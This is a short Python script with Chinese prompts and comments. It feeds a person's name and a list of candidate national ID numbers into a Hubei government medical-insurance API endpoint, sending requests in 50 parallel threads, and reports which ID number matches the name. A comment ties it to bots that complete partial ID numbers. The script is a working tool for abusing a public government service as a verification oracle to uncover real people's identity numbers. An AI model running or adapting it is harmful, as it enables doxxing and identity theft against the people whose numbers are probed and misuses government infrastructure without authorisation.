import requests
import json
from concurrent.futures import ThreadPoolExecutor
import sys
#*/挖到 hand机器人补齐接口同款
verify_url = 'https://ybj.hubei.gov.cn/hubeiHallSt/api/hsa-pss-pw//e-voucher/query/active'

name = input("请输入姓名：")
id_cards = input("请输入身份证号码（一行一个））：").splitlines()

headers = {
    'Host': 'ybj.hubei.gov.cn'
}

def verify_id_card(id_card):
    data = {
        "appUserId": id_card,
        "applySrc": 2,
        "idNo": id_card,
        "idType": "01",
        "systemCall": "1",
        "userName": name,
    }

    response = requests.post(verify_url, headers=headers, data=json.dumps(data))
    response_data = response.json()

    result = f"{name}-{id_card}-"

    if response_data['code'] == '0':
        print(result + "一致")
        return True, result
    else:
        print(result + "不一致")
        return False, None

success_found = False
with ThreadPoolExecutor(max_workers=50) as executor:
    futures = []
    for id_card in id_cards:
        future = executor.submit(verify_id_card, id_card)
        futures.append(future)
    for future in futures:
        success, result = future.result()
        if success:
            success_found = True
            print(f"校验成功：{result}")
            executor.shutdown(wait=False)
